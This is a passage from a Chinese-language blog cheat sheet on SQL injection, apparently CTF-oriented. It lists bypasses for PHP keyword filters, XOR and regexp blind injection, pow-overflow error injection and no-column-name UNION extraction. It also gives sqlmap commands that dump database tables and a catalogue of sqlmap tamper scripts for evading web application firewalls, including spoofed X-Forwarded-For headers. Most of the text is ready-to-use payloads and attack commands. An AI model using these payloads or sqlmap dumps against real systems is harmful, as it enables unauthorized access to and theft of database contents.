limit, group by, select, ', hex, substr, 空格php代码 preg_match('/(and|or|union|where|limit|group by|select|\'|hex|substr|\s)/i', $id)会过滤的攻击代码 1 &amp;&amp; lpad(user,7,1)/td&gt;绕过方式 1%0b||%0blpad(user,7,1)过滤关键字 and or union wherephp代码 preg_match('/(and|or|union|where)/i',$id)会过滤的攻击代码 1 || (select user from users where user_id = 1) = 'admin'绕过方式 1 || (select user from users limit 1) = 'admin' 各种骚姿势一把梭update、insert、delete注入MySQL下Update、Insert注入方法 pow溢出报错pow(x,y)表示计算x的y次方，当计算值过大时，会发生DOUBLE溢出，数据库报错 1select 1 and if(1=1,1,pow(2,2222222222222222222)) 过滤了延时语句，正常页面与错误页面没有区别，当sql语句出错时会返回自定义的错误页面。 XOR注入123admin'^(ascii(mid((password)from(i)))&gt;j)^'1'='1'%23或者admin'^(ascii(mid((password)from(i)for(1)))&gt;j)^'1'='1'%23 过滤了关键字：and、or过滤了逗号，过滤了空格 regexp注入1select (select语句) regexp '正则' 过滤了=、in、like order by盲注暂略 无列名注入在不知道 MySQL 列名的情况下泄露数据的 SQL 注入技巧 12-1 union select 1,(select `4` from (select 1,2,3,4,5,6 union select * from users)a limit 1,1)-- -需要注意字段数，以及回显的地方，以及要查询的东西 适用于：数据泄露或者过滤关键字段名的一把梭 sqlmap一把梭基础指令一把梭URL直接注入 123456789python2 sqlmap.py -u "www.xxx.com?id=1" --dbspython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx --tablespython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx --tablespython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx -T xxx --columnspython2 sqlmap.py -u "www.xxx.com?id=1" -D xxx -T xxx -C xxx --dump 从文件中加载HTTP请求先从burpsuite Copt to file 然后 1python2 sqlmap.py -r "选择你保存的文件的路径" 适用于：cookie，POST数据等 tamper一把梭1234567891011121314151617181920212223242526272829303132333435363738394041apostrophemask.py 用UTF-8全角字符替换单引号字符apostrophenullencode.py 用非法双字节unicode字符替换单引号字符appendnullbyte.py 在payload末尾添加空字符编码base64encode.py 对给定的payload全部字符使用Base64编码between.py 分别用“NOT BETWEEN 0 AND #”替换大于号“&gt;”，“BETWEEN # AND #”替换等于号“=”bluecoat.py 在SQL语句之后用有效的随机空白符替换空格符，随后用“LIKE”替换等于号“=”chardoubleencode.py 对给定的payload全部字符使用双重URL编码（不处理已经编码的字符）charencode.py 对给定的payload全部字符使用URL编码（不处理已经编码的字符）charunicodeencode.py 对给定的payload的非编码字符使用Unicode URL编码（不处理已经编码的字符）concat2concatws.py 用“CONCAT_WS(MID(CHAR(0), 0, 0), A, B)”替换像“CONCAT(A, B)”的实例equaltolike.py 用“LIKE”运算符替换全部等于号“=”greatest.py 用“GREATEST”函数替换大于号“&gt;”halfversionedmorekeywords.py 在每个关键字之前添加MySQL注释ifnull2ifisnull.py 用“IF(ISNULL(A), B, A)”替换像“IFNULL(A, B)”的实例lowercase.py 用小写值替换每个关键字字符modsecurityversioned.py 用注释包围完整的查询modsecurityzeroversioned.py 用当中带有数字零的注释包围完整的查询multiplespaces.py 在SQL关键字周围添加多个空格nonrecursivereplacement.py 用representations替换预定义SQL关键字，适用于过滤器overlongutf8.py 转换给定的payload当中的所有字符percentage.py 在每个字符之前添加一个百分号randomcase.py 随机转换每个关键字字符的大小写randomcomments.py 向SQL关键字中插入随机注释securesphere.py 添加经过特殊构造的字符串sp_password.py 向payload末尾添加“sp_password” for automatic obfuscation from DBMS logsspace2comment.py 用“/**/”替换空格符space2dash.py 用破折号注释符“–”其次是一个随机字符串和一个换行符替换空格符space2hash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符space2morehash.py 用磅注释符“#”其次是一个随机字符串和一个换行符替换空格符space2mssqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符space2mssqlhash.py 用磅注释符“#”其次是一个换行符替换空格符space2mysqlblank.py 用一组有效的备选字符集当中的随机空白符替换空格符space2mysqldash.py 用破折号注释符“–”其次是一个换行符替换空格符space2plus.py 用加号“+”替换空格符space2randomblank.py 用一组有效的备选字符集当中的随机空白符替换空格符unionalltounion.py 用“UNION SELECT”替换“UNION ALL SELECT”unmagicquotes.py 用一个多字节组合%bf%27和末尾通用注释一起替换空格符varnish.py 添加一个HTTP头“X-originating-IP”来绕过WAFversionedkeywords.py 用MySQL注释包围每个非函数关键字versionedmorekeywords.py 用MySQL注释包围每个关键字xforwardedfor.py 添加一个伪造的HTTP头“X-Forwarded-For”来绕过WAF]]></content>
      <categories>
        <category>Web</category>
      </categories>
      <tags>
        <tag>SQL Injection</tag>
      </tags>
  </entry>
</search>
